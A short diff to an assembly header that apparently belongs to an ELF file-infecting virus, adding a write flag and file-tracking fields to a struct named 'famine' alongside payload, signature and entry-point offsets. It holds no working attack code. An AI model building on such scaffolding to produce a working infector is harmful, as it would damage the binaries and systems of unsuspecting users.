@@ -1,6 +1,7 @@
 %define PROG_SIZE   _end - main
 %define JMP_OFFSET  jump - main
 %define SIGNATURE_SIZE _end - signature
+%define O_WRONLY	1
 %define O_RDWR      2
 %define O_APPEND	02000
 %define SEEK_END    2
@@ -47,8 +48,10 @@ struc Elf64_Phdr
 endstruc
 
 struc famine
+    fileName:   resq 1
     fd:         resq 1
     fileSize:   resq 1
+    do_not_touch: resq 1
     fileData:   resq 1
     pload:      resq 1
     entry:      resq 1
